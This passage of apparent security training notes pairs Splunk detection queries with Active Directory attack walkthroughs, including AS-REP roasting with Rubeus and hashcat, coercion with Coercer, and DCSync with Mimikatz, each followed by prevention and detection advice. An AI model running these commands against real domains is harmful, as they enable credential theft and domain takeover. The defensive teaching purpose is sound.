index="main" EventCode=7 NOT (Image="C:\\Windows\\System32*") NOT (Image="C:\\Program Files*") | bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded > 3 | stats count by Image, unique_dlls_loaded | sort - unique_dlls_loaded
```

**Example 5: Detecting Multiple Instances of a Process on the Same Host**

Repetitive process executions can indicate abnormal activity:

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | transaction ComputerName, Image | where mvcount(ProcessGuid) > 1 | stats count by Image, ParentImage
```

For deeper analysis, target specific pairs such as `rundll32.exe` and `svchost.exe`:

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | transaction ComputerName, Image | where mvcount(ProcessGuid) > 1 | search Image="C:\\Windows\\System32\\rundll32.exe" ParentImage="C:\\Windows\\System32\\svchost.exe" | table CommandLine, ParentCommandLine
```

**Conclusion**

Using analytics, we establish behavioral baselines and identify deviations to uncover suspicious activity. While this approach highlights anomalies, it works best in combination with TTP-based detection to cover a broader spectrum of potential threats.

#### **Detecting\_Attacker\_Behavior\_With\_TTPs**

In cybersecurity, identifying and monitoring for attacker tactics, techniques, and procedures (TTPs) are essential for effective threat detection. This process involves recognizing patterns that indicate either known malicious behavior or anomalies that deviate from the norm. Detection strategies in Splunk involve two key approaches:

1. **Using Known TTPs**: Leveraging our understanding of specific attack behaviors to create detection rules.
2. **Anomaly Detection**: Using statistical analysis to identify unusual patterns without prior knowledge of specific attacks.

Together, these approaches provide a comprehensive toolkit for recognizing and responding to various threats. Regularly tuning queries and thresholds in both methods enhances accuracy and reduces false positives.

**Crafting SPL Searches Based on Known TTPs**

Using known TTPs as a foundation, detection queries are crafted to match behaviors associated with specific threats. Examples of detection searches following this approach are outlined below.

**Example: Detecting Reconnaissance Activities with Native Windows Binaries**

Attackers often use native Windows binaries like `net.exe` and `ipconfig.exe` for reconnaissance. Sysmon Event ID 1 can help identify such actions.

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=*\\ipconfig.exe OR Image=*\\net.exe OR Image=*\\whoami.exe OR Image=*\\netstat.exe OR Image=*\\nbtstat.exe OR Image=*\\hostname.exe OR Image=*\\tasklist.exe | stats count by Image,CommandLine | sort - count
```

**Example: Detecting Malicious Payload Requests Hosted on Reputable Domains**

Attackers may host malicious tools on platforms like [githubusercontent.com](http://githubusercontent.com/). Sysmon Event ID 22 can identify these requests.

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=22 QueryName="*github*" | stats count by Image, QueryName
```

**Example: Detecting PsExec Usage**

PsExec, a powerful tool for remote command execution, is frequently leveraged by attackers. Relevant Sysmon events include Event ID 13, Event ID 11, and Event ID 18.

**Case 1: Sysmon Event ID 13**

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\\Windows\\system32\\services.exe" TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath" | rex field=Details "(?<reg_file_name>[^\\\\]+)$" | eval file_name = if(isnull(file_name),reg_file_name,lower(file_name)) | stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName
```

**Case 2: Sysmon Event ID 11**

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System | stats count by TargetFilename
```

**Case 3: Sysmon Event ID 18**

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System | stats count by PipeName
```

**Example: Detecting Archive File Use for Data Transfer**

Attackers may use zip, rar, or 7z files for tool transfer or data exfiltration.

```
index="main" EventCode=11 (TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z") | stats count by ComputerName, User, TargetFilename | sort - count
```

**Example: Detecting Payload Downloads via PowerShell or Edge**

Attackers often use PowerShell or web browsers for downloads.

**PowerShell Downloads**

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*powershell.exe*" | stats count by Image, TargetFilename | sort + count
```

**Edge Downloads with Zone Identifier**

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*msedge.exe" TargetFilename=*"Zone.Identifier" | stats count by TargetFilename | sort + count
```

**Example: Detecting Execution from Suspicious Locations**

```
index="main" EventCode=1 | regex Image="C:\\\\Users\\\\.*\\\\Downloads\\\\.*" | stats count by Image
```

**Example: Detecting Executables Created Outside Windows Directory**

```
index="main" EventCode=11 (TargetFilename="*.exe" OR TargetFilename="*.dll") TargetFilename!="*\\windows\\*" | stats count by User, TargetFilename | sort + count
```

**Example: Detecting Misspelled Binaries (e.g., PSEXESVC.exe)**

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 (CommandLine="*psexe*.exe" NOT (CommandLine="*PSEXESVC.exe" OR CommandLine="*PsExec64.exe")) OR (ParentCommandLine="*psexe*.exe" NOT (ParentCommandLine="*PSEXESVC.exe" OR ParentCommandLine="*PsExec64.exe")) OR (ParentImage="*psexe*.exe" NOT (ParentImage="*PSEXESVC.exe" OR ParentImage="*PsExec64.exe")) OR (Image="*psexe*.exe" NOT (Image="*PSEXESVC.exe" OR Image="*PsExec64.exe")) | table Image, CommandLine, ParentImage, ParentCommandLine
```

**Example: Detecting Non-standard Ports in Communication**

```
index="main" EventCode=3 NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21) | stats count by SourceIp, DestinationIp, DestinationPort | sort - count
```

By employing TTP-based SPL searches, we can detect known attack patterns in our network. However, focusing only on known TTPs has limitations, as attackers often evolve their techniques to evade detection.

**Conclusion**

Creating detections based on known TTPs enables faster identification of familiar threats, while anomaly detection surfaces previously unknown risks. Together, these strategies provide a strong foundation for detecting malicious activity in Splunk, though continuous tuning is required to adapt to evolving attacker tactics.

#### **Intrusion\_Detection**

**Introduction**

In this module, we expand from individual log analysis to monitoring entire networks, using Windows Event Logs across multiple machines to identify potential malicious activity. We aim to filter out false positives, crafting precise queries and alerts to proactively secure the environment.

**Ingesting Data Sources**

We need access to various data sources for effective threat hunting. Options include:

- **BOTS**: Provided by Splunk with setup instructions.
- **[logs.to](http://logs.to/)**: Generates dummy logs in JSON format. When using [logs.to](http://logs.to/) data, set Indexed Extractions to JSON for accurate parsing.

**Query Example to Retrieve All Events:**

```
index="main" earliest=0
```

This dataset will contain over 500,000 events across various sourcetypes, representing multiple infections and types of attacks.

**Effective Searching Techniques**

Efficient querying is crucial for threat hunting. As SIEM data grows, so does processing time. Targeted searches help minimize resource usage and reduce irrelevant data. For instance:

**Generalized vs. Targeted Queries**

1. **General Search (String Anywhere):**
  ```
  index="main" uniwaldo.local
  ```
  This search will retrieve all occurrences of the string "uniwaldo.local" across sourcetypes.
2. **Wildcard Search (Anywhere in String):**
  ```
  index="main" *uniwaldo.local*
  ```
  Slower performance due to broad search scope.
3. **Targeted Field Search:**
  ```
  index="main" ComputerName="*uniwaldo.local"
  ```
  Faster due to specific targeting, reducing resource load.

**Identifying Sysmon Events by EventCode**

Using Sysmon data, we can break down activity by EventCode, helping identify patterns indicative of attacks.

**Event Codes for Threat Detection**:

- **Event ID 1** - Process Creation (e.g., abnormal parent-child process hierarchies)
- **Event ID 3** - Network Connections (noise-heavy but useful for spotting anomalies)
- **Event ID 5** - Process Termination (helps detect suspicious process kills)
- **Event ID 6** - Driver Loaded (useful for identifying BYOD attacks)
- **Event ID 10** - Process Access (useful for memory dumps and injection detection)
- **Event ID 25** - Process Tampering (e.g., process herpadering, mini AV alert filter)

**Query Example - Identifying Suspicious Parent-Child Processes**:

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | stats count by ParentImage, Image
```

This query reveals process chains, aiding in detecting unusual executions (e.g., `notepad.exe` launching `powershell.exe`).

**Advanced Threat Detection and IP Investigation**

To identify connections to suspicious IP addresses, we can query IP-related events:

**Query Example**:

```
index="main" 10.0.0.229 | stats count by sourcetype
```

Examining specific sources, such as Sysmon and Linux syslog, helps confirm machine interactions with external IPs, potentially signaling compromise.

**Targeting Credential Dumping - Sysmon Event Code 10**

**Query Example - Detecting Access to**`lsass`**Process**:

```
index="main" EventCode=10 lsass | stats count by SourceImage
```

This query helps identify unusual processes accessing `lsass.exe`, a common target for credential dumping.

**Creating Effective Alerts**

To develop reliable alerts, we focus on filtering noise and targeting high-fidelity indicators. For instance, by targeting API calls from `UNKNOWN` memory regions, we filter out common false positives.

**Step-by-Step Alert Query**

1. **Identify All**`UNKNOWN`**Call Stacks**:
  ```
  index="main" CallTrace="*UNKNOWN*" | stats count by EventCode
  ```
2. **Filter Known JITs,****[Microsoft.Net](http://microsoft.net/)****, and WOW64 Processes**:
  ```
  index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* | where SourceImage!=TargetImage | stats count by SourceImage
  ```
3. **Exclude**`Explorer.exe`**and Group Results by Call Trace**:
  ```
  index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!="C:\\Windows\\Explorer.EXE" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrace
  ```

This method produces a robust alert system that distinguishes between legitimate JIT processes and potential threats.

**Conclusion**

Through these techniques, we've crafted efficient search strategies, targeted specific threat behaviors, and developed robust alerts. While simplified for this exercise, these methods apply to larger, real-world datasets. Building alerts that are hard to bypass and identifying potential improvements will strengthen security further. Remember, effective SIEM management is an evolving skill, requiring a balance of innovation, analytical skills, and vigilance.

#### **Using\_Splunk\_Applications**

**Splunk Applications Overview**

Splunk applications, or apps, are packages that extend the capabilities of Splunk Enterprise or Splunk Cloud, enabling users to manage specific types of operational data. Each app is tailored to handle data from specific technologies or use cases, acting as a pre-built knowledge package for that data. Features provided by Splunk apps include:

- Custom data inputs
- Custom visualizations
- Dashboards, alerts, reports, and more

**Installing and Using the Sysmon App for Splunk**

The **Sysmon App for Splunk** by Mike Haag helps enhance security monitoring capabilities. Here’s how to install and configure it:

1. **Sign Up on Splunkbase**
  - Create a free account on Splunkbase.
2. **Download the App**
  - Log in to Splunkbase and locate the Sysmon App for Splunk.
3. **Add the App to the Search Head**
  - Navigate to the Sysmon App page, download the application, and install it on your Splunk Search Head.
4. **Configure the Application**
  - Adjust the app’s macros to load events accurately.
5. **Access the Sysmon App**
  - Go to the "Apps" menu on the Splunk home page, select the Sysmon App, and open the **File Activity** tab.
6. **Set the Time Range**
  - Set the time picker to **All time** and click **Submit**.

**Troubleshooting - “Top Systems” Section Not Displaying Results**

- **Problem**: No results in the “Top Systems” section.
- **Solution**:
  1. Click on **Edit** in the upper right corner.
  2. Modify the search to replace `Computer` with `ComputerName` (Sysmon Event ID 11 events use `ComputerName` instead of `Computer`).
  3. Click **Apply** to update and display results.

After these adjustments, results should populate successfully in the "Top Systems" section.

**5. Windows Attacks & Defense**

#### **AS-REProasting**

**Description**

The **AS-REProasting** attack is similar to Kerberoasting. Attackers can obtain crackable hashes for user accounts with the **Do not require Kerberos preauthentication** property enabled. The success of this attack relies on cracking the user account password.

**Attack**

1. **Extracting Crackable Hashes**: Using tools like Rubeus, hashes can be extracted for each user without Kerberos preauthentication:
  ```
  PS C:\\Users\\bob\\Downloads> .\\Rubeus.exe asreproast /outfile:asrep.txt
  ```
  This action saves the hashes for accounts without preauthentication enabled to `asrep.txt`.
2. **Preparing the Hash for Cracking**: Modify the extracted hash by adding `23$` after `$krb5asrep$`:
  ```
  $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
  ```
3. **Cracking Hash with hashcat**: Use hashcat with mode 18200, specifically for AS-REPRoastable hashes:
  ```
  sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
  ```
4. **Viewing the Result**: After cracking, view the result to obtain the cleartext password.
  ```
  cat asrepcrack.txt
  ```

**Prevention**

This attack's success largely depends on the password strength of accounts with **Kerberos preauthentication** disabled.

- **Review and Limit Usage**: Only use the "no preauthentication" setting if absolutely necessary, and conduct quarterly reviews to ensure accounts don't inadvertently have this property.
- **Strong Password Policy**: Apply a separate policy requiring a minimum of 20 characters for users with this property.

**Detection**

When a TGT is requested, Event ID 4768 is generated. While this event is common and heavily logged, correlation to specific IPs or VLANs can help differentiate valid login attempts from potential malicious requests.

**Honeypot**

A honeypot user can be effective for detecting AS-REProasting attempts. Create an unused, privileged account with Kerberos preauthentication disabled. Ensure it meets these criteria:

1. **Old Account**: Use an old account with a password that hasn’t changed in years.
2. **Recent Login Activity**: Ensure logins occurred post-password change to avoid suspicion.
3. **Assigned Privileges**: The account should have privileges to be of interest to attackers.

Example honeypot setup:

- **User**: `svc-iam` with specific privileges and preauthentication disabled.

**Caution**

Be strategic in setting up honeypots to avoid making the setup too obvious to attackers. Choose the best-suited detection methods for your environment.

#### **Active\_Directory\_Introduction\_and\_Terminology**

**What is Active Directory?**

Active Directory (AD) is Microsoft’s directory service for Windows enterprise environments, first released in 2000 with Windows Server 2000. Built on x.500 and LDAP protocols, AD supports centralized management of resources including users, computers, groups, and network devices, along with access management and group policies.

AD is widely used as the primary Identity and Access Management (IAM) solution in enterprises. A compromise of AD results in full access to all systems and data within the domain, representing a critical security risk if vulnerabilities are exploited.

**Key Concepts**

- **Domain**: A group of objects sharing the same AD database (e.g., users, devices).
- **Tree**: Group of one or more domains (e.g., `test.local`, `staging.test.local`).
- **Forest**: Collection of multiple trees, representing the highest hierarchical level.
- **Organizational Unit (OU)**: Containers holding user groups, computers, and other OUs.
- **Trust**: Relationship allowing access to resources across domains.
- **Domain Controller**: The highest authority in AD, managing authentication and authorization.
- **Active Directory Data Store**: Contains files like NTDS.DIT, storing directory information.

**Core Protocols and Authentication in AD**

- **LDAP**: Protocol for querying and modifying AD data.
- **Authentication Methods**:
  - **Username/Password**: Stored/transmitted as hashes (LM, NTLM, etc.).
  - **Kerberos Tickets**: Tokens for authenticated access using cryptographic proof of identity.
  - **LDAP Authentication**: Via username/password or certificates.
  - **Key Distribution Center (KDC)**: The Kerberos service generating tickets.

**Default Privileged Groups in AD**

AD includes highly privileged groups like **Domain Admins** and **Enterprise Admins**. These groups grant broad access rights across domain-joined machines and within the forest. Mismanagement of these groups can lead to serious security risks.

**Logon Types**

Windows supports multiple logon types, which affect credential traces left on systems. Logon types except for Network logon (type 3) leave credentials behind.

**Tools for Managing Active Directory**

AD interaction is enabled by tools like **Remote Server Administration Tools (RSAT)** and interfaces like **Active Directory Users and Computers** and **Group Policy Management Console**.

**Important Ports in AD Environments**

- **53**: DNS
- **88**: Kerberos
- **135**: WMI/RPC
- **137-139, 445**: SMB
- **389, 636**: LDAP
- **3389**: RDP
- **5985, 5986**: PowerShell Remoting (WinRM)

**Real-world Implications of AD Security**

Active Directory plays a pivotal role in enterprise environments, managing services like DNS, PKI, and Endpoint Configuration. If these services are compromised, an attacker could escalate privileges to control the forest. To reduce risks, organizations must classify and monitor additional services added to AD.

**AD Limitations and Attack Surface**

- **Complexity**: Example - Nested group memberships can create convoluted privilege chains.
- **Design**: AD’s use of Group Policy Objects (GPOs) relies on SYSVOL shared folders, accessible via SMB. With privileged credentials, attackers could remotely execute code on Domain Controllers over SMB.
- **Legacy Protocols**: Windows uses legacy protocols like NetBIOS and LLMNR by default, which can broadcast credentials on the network, exposing them to potential capture.

Active Directory remains central to enterprise IAM, but its complexity, design, and reliance on legacy protocols demand robust security practices, including segmentation, defense-in-depth, and continuous monitoring to prevent and detect unauthorized access.

#### **Coercing\_Attacks\_&\_Unconstrained Delegation**

**Description**

Coercing attacks have emerged as a reliable way to escalate privileges from any user to Domain Administrator. In a typical Active Directory (AD) environment, nearly every setup is vulnerable to such attacks. The PrinterBug exemplifies coercion, but several other RPC functions can achieve similar results, enabling any domain user to coerce a RemoteServer$ to authenticate to any domain machine. The **Coercer** tool was developed to exploit multiple vulnerable RPC functions.

**Impact**

Once coercion is established, the attacker can select from several "follow-up" attack methods:

- **Relay to another Domain Controller (DC)** and perform DCSync if SMB Signing is disabled.
- **Force the DC to connect to an Unconstrained Delegation (UD) machine**, capturing the TGT in the UD server’s memory (tools: Rubeus, Mimikatz).
- **Relay to Active Directory Certificate Services**, allowing threat agents to obtain and use a DC certificate (e.g., for DCSync).
- **Resource-Based Kerberos Delegation** for the relayed machine, enabling attackers to authenticate as any Administrator on that machine.

**Attack Methodology**

For this scenario, we’ll capture a TGT on a compromised server configured for Unconstrained Delegation, using the **Coercer** tool.

**Step-by-Step Attack Execution**

1. **Identify Unconstrained Delegation Servers** using PowerView:
  ```
  Get-NetComputer -Unconstrained | select samaccountname
  ```
  Example Output:
  ```
  samaccountname
  --------------
  DC1$
  SERVER01$
  WS001$
  DC2$
  ```
2. **Run Rubeus** on the compromised host (e.g., WS001) to monitor for new logons:
  ```
  .\\Rubeus.exe monitor /interval:1
  ```
  Sample Output:
  ```
  [*] 18/12/2022 22.37.09 UTC - Found new TGT:
    User                  :  bob@EAGLE.LOCAL
    StartTime             :  18/12/2022 23.30.09
    ...
  ```
3. **Run Coercer** on the Kali machine to trigger authentication requests towards the UD machine:
  ```
  Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
  ```
  Example Output:
  ```
  [>] Pipe '\\PIPE\\lsarpc' is accessible!
    ...
  [>] Pipe '\\PIPE\\spoolss' is accessible!
    ...
  [+] All done!
  ```
4. **Capture the DC TGT** on WS001 using Rubeus:
  ```
  [*] 18/12/2022 22.55.52 UTC - Found new TGT:
    User                  :  DC1$@EAGLE.LOCAL
    StartTime             :  18/12/2022 23.30.21
    ...
  ```
5. **Use the TGT for Domain Authentication**. One option is to load the TGT in Rubeus:
  ```
  .\\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
  ```
6. **Perform a DCSync Attack** with Mimikatz to obtain the Administrator’s hash:
  ```
  .\\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
  ```

**Prevention**

Windows lacks built-in capabilities to monitor and control RPC calls to mitigate this attack. Two general prevention approaches:

- **Third-Party RPC Firewall**: Tools like Zero Networks’ RPC firewall can audit and block dangerous RPC functions, with an option to customize blocking for new OPNUMs.
- **Restrict Outbound Traffic on Ports 139 and 445**: Block these ports on Domain Controllers and other infrastructure servers except where necessary for AD functions. This can prevent not only known coercing attacks but also newly discovered vulnerabilities.

**Detection**

Detecting RPC activity abuse is challenging without third-party tools. Zero Networks' RPC firewall provides comprehensive detection capabilities. Alternatively, monitoring firewall logs can help identify unusual patterns.

1. **Firewall Log Analysis**: Successful coercing attacks result in outbound traffic to the attacker machine, often on port 445.
2. **Traffic Blocking Detection**: Blocking outbound traffic on ports 139 and 445 prevents attackers from receiving coerced TGTs, and blocked connections serve as indicators of suspicious activity.

By monitoring for dropped traffic to ports 139 and 445, especially from critical infrastructure, unusual or unexpected traffic patterns can signal potential coercing attacks.

---

**Note**: Implementing both RPC firewalling and port restriction improves defenses against coercing attacks significantly.

#### **Credentials\_in\_Object\_Properties**

**Description**

Objects in Active Directory have a plethora of different properties; for example, a user object can contain properties that contain information such as:

- Is the account active
- When does the account expire
- When was the last password change
- What is the name of the account
- Office location for the employee and phone number

When administrators create accounts, they fill in those properties. A common practice in the past was to add the user's (or service account's) password in the Description or Info properties, thinking that administrative rights in AD are needed to view these properties. However, every domain user can read most properties of an object (including Description and Info).

**Attack**

A simple PowerShell script can query the entire domain by looking for specific search terms/strings in the Description or Info fields:

```
Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } |
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        fl
}
```

We will run the script to hunt for the string `pass`, to find the password `Slavi123` in the Description property of the user `bonni`:

```
PS C:\\Users\\bob\\Downloads> SearchUserClearTextInformation -Terms "pass"

SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi123
Info                 :
PasswordNeverExpires : True
PasswordLastSet      : 05/12/2022 15.18.05
```

**Prevention**

We have many options to prevent this attack/misconfiguration:

- Perform continuous assessments to detect the problem of storing credentials in properties of objects.
- Educate employees with high privileges to avoid storing credentials in properties of objects.
- Automate as much as possible of the user creation process to ensure that administrators don't handle the accounts manually, reducing the risk of introducing hardcoded credentials in user objects.

**Detection**

Baselining users' behavior is the best technique for detecting abuse of exposed credentials in properties of objects. Although this can be tricky for regular user accounts, triggering an alert for administrators/service accounts whose behavior can be understood and baselined is easier. Automated tools that monitor user behavior have shown increased success in detecting abnormal logons. In the example above, assuming that the provided credentials are up to date, we would expect events with event ID 4624/4625 (failed and successful logon) and 4768 (Kerberos TGT requested). Below is an example of event ID 4768:

Unfortunately, the event ID 4738 generated when a user object is modified does not show the specific property that was altered, nor does it provide the new values of properties. Therefore, we cannot use this event to detect if administrators add credentials to the properties of objects.

**Honeypot**

Storing credentials in properties of objects is an excellent honeypot technique for not-very-mature environments. If struggling with basic cyber hygiene, then it is more likely expected to have such issues (storing credentials in properties of objects) in an AD environment. For setting up a honeypot user, we need to ensure the followings:

- The password/credential is configured in the Description field, as it's the easiest to pick up by any adversary.
- The provided password is fake/incorrect.
- The account is enabled and has recent login attempts.
- While we can use a regular user or a service account, service accounts are more likely to have this exposed as administrators tend to create them manually. In contrast, automated HR systems often make employee accounts (and the employees have likely changed the password already).
- The account has the last password configured 2+ years ago (makes it more believable that the password will likely work).

Because the provided password is wrong, we would primarily expect failed logon attempts; three event IDs (4625, 4771, and 4776) can indicate this. Here is how they look in our playground environment if an attacker is attempting to authenticate with the account `svc-iis` and a wrong password:

- 4625: An account failed to log on
- 4771: Kerberos pre-authentication failed
- 4776: ## The computer attempted to validate the credentials for an account
  - Generated for both successful and failed credential validations

#### **Credentials\_in\_Shares**

**Description**

Credentials exposed in network shares are (probably) the most encountered misconfiguration in Active Directory to date. Any medium/large enterprises will undoubtedly have exposed credentials, although it may also happen in small businesses. It almost feels like we are moving from "Don't leave your password on a post-it note on your screen" to "Don't leave unencrypted credentials and authorization tokens scattered everywhere".

We often find credentials in network shares within scripts and configuration files (batch, cmd, PowerShell, conf, ini, and config). In contrast, credentials on a user's local machine primarily reside in text files, Excel sheets, or Word documents. The main difference between the storage of credentials on shares and machines is that the former poses a significantly higher risk, as it may be accessible by every user. A network share may be accessible by every user for four main reasons:

1. One admin user initially creates the shares with properly locked down access but ultimately opens it to everyone. Another admin of the server could also be the culprit. Nonetheless, the share eventually becomes open to Everyone or Users, and recall that a server's Users group contains Domain users as its member in Active Directory environments. Therefore every domain user will have at least read access (it is wrongly assumed that adding 'Users' will give access to only those local to the server or Adm...
2. The administrator adding scripts with credentials to a share is unaware it is a shared folder. Many admins test their scripts in a scripts folder in the C:\\ drive; however, if the folder is shared (for example, with Users), then the data within the scripts is also exposed on the network.
3. Another example is purposely creating an open share to move data to a server (for example, an application or some other files) and forgetting to close it later.
4. Finally, in the case of hidden shares (folders whose name ends with a dollar sign ),thereisamisconceptionthatuserscannotfindthefolderunlesstheyknowwhereitexists;themisunderstandingcomesfromthefactthatExplorerinWindowsdoesnotdisplayfilesorfolderswhosenameendwitha, however, any other tool will show it.

**Attack**

The first step is identifying what shares exist in a domain. There are plenty of tools available that can achieve this, such as PowerView's `Invoke-ShareFinder`. This function allows specifying that default shares should be filtered out (such as c$ and IPC$) and also check if the invoking user has access to the rest of the shares it finds. The final output contains a list of non-default shares that the current user account has at least read access to:

```
PS C:\\Users\\bob\\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

Example Output:

```
\\\\DC2.eagle.local\\NETLOGON      - Logon server share
\\\\DC2.eagle.local\\SYSVOL        - Logon server share
\\\\WS001.eagle.local\\Share       -
\\\\WS001.eagle.local\\Users       -
\\\\Server01.eagle.local\\dev$     -
\\\\DC1.eagle.local\\NETLOGON      - Logon server share
\\\\DC1.eagle.local\\SYSVOL        - Logon server share
```

A few automated tools exist, such as `SauronEye`, which can parse a collection of files and pick up matching words. However, because there are few shares in the playground, we will take a more manual approach (Living Off the Land) and use the built-in command `findstr` for this attack.

**Arguments:**

- `/s` forces to search the current directory and all subdirectories
- `/i` ignores case in the search term
- `/m` shows only the filename for a file that matches the term

**Example Commands:**

```
PS Microsoft.PowerShell.Core\\FileSystem::\\\\Server01.eagle.local\\dev$> findstr /m /s /i "pass" *.bat
```

**Prevention**

The best practice to prevent these attacks is to lock down every share in the domain so there are no loose permissions. Regular scans (e.g., weekly) on AD environments to identify any new open shares or credentials exposed in older ones are necessary.

**Detection**

Understanding and analyzing users' behavior is the best detection technique for abusing discovered credentials in shares. Event IDs to monitor include:

- **4624** for successful logon
- **4768** for Kerberos TGT requests

**Honeypot**

A honeypot user in AD environments: a semi-privileged username with a wrong password. Below is a good setup for the account:

- A service account created 2+ years ago, with the last password change at least one year ago.
- The account is still active in the environment.

Because the provided password is wrong, we would primarily expect failed logon attempts.

**Example Event IDs:**

- **4625** for failed logon
- **4771** for failed Kerberos pre-authentication
- **4776** for failed NTLM authentication

#### **DCSync**

**Description**

DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:

- **Replicating Directory Changes**
- **Replicating Directory Changes All**

**Attack**

We will utilize the user Rocky (whose password is Slavi123) to showcase the DCSync attack. When we check the permissions for Rocky, we see that he has Replicating Directory Changes and Replicating Directory Changes All assigned:

**Step 1: Start Command Shell as Rocky**

```
C:\\Users\\bob\\Downloads>runas /user:eagle\\rocky cmd.exe
Enter the password for eagle\\rocky:
Attempting to start cmd.exe as user "eagle\\rocky"
```

**Step 2: Use Mimikatz to Perform DCSync**

To execute DCSync, we use Mimikatz. This example targets the user 'Administrator':

```
C:\\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
```

Alternatively, we can use the `/all` parameter to dump the hashes of the entire AD environment.

**Prevention**

Since DCSync replicates common operations in Active Directory, complete prevention is not achievable directly. However, **using third-party solutions like RPC Firewall** can restrict replication permissions to trusted Domain Controllers only, allowing replication only for essential accounts.

**Detection**

Detecting DCSync is possible by monitoring for **event ID 4662**, as each replication attempt logs this event. To reduce false positives, ensure:

1. The event properties `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` are present.
2. Whitelist systems/accounts that need replication, such as Azure AD Connect.

**Example Event**

When Mimikatz is used for DCSync, the following event may be generated:

- **Event ID**: 4662
- **Details**: Shows a user account initiating replication, which can serve as an alert to unauthorized DCSync attempts.

#### **GPO\_Permissions\_GPO\_Files**

**Description**

A Group Policy Object (GPO) is a virtual collection of policy settings that has a unique name. GPOs are widely used in Active Directory (AD) for configuration management. Each GPO contains policy settings linked to an Organizational Unit (OU) in AD to apply settings to objects within that OU or any child OU. GPOs can be restricted to specific objects or filtered, for example, by specifying an AD group or using a WMI filter.

When a new GPO is created, only Domain admins (and similar privileged roles) can modify it. However, different delegations within environments may allow less privileged accounts to perform edits on GPOs. Some organizations have GPOs that allow modifications by 'Authenticated Users' or 'Domain Users,' which means any compromised user account may allow attackers to alter these GPOs. Such modifications may include adding start-up scripts or scheduled tasks to execute a file, enabling adversaries to compromise computer objects in the OUs linked to the vulnerable GPOs.

Similarly, administrators may install software or configure start-up scripts through GPOs that rely on files located on network shares. If these shares are misconfigured, attackers may replace files with malicious versions. Even if the GPO permissions are intact, the attack can be executed through misconfigured NTFS permissions on deployed files.

**Attack**

To abuse GPO permissions, an attacker can directly edit a GPO or replace a file in a network share used by the GPO.

**Prevention**

1. **Lockdown GPO permissions:** Limit modification rights to a small group of trusted users or a specific account to prevent unauthorized GPO edits.
2. **Review GPO permissions:** Regularly review and automate hourly checks on GPO permissions to ensure no deviations from expected configurations.
3. **Secure network shares:** Avoid using files from network shares that can be modified by multiple users to prevent file replacement attacks.

**Detection**

- **Event ID 5136:** This event ID logs GPO modifications if Directory Service Changes auditing is enabled. Detecting unexpected modifications to GPOs, especially by users without expected permissions, should raise an alert.

**Honeypot**

Using a misconfigured GPO or file as a honeypot can be a strategy for detecting unauthorized modifications. However, it’s recommended only for mature environments capable of responding quickly to vulnerabilities. Consider the following guidelines for honeypot GPOs:

- Link the GPO only to non-critical servers.
- Monitor modifications continuously with automation in place.
- Unlink or disable the GPO if a modification is detected.

**Example PowerShell Script for GPO Modification Detection**

This PowerShell script demonstrates automation for detecting and disabling accounts that modify a specified honeypot GPO. The honeypot GPO is identified by a GUID value, and the script disables any account associated with modifications detected every 15 minutes.

```
# Define filter for the last 15 minutes
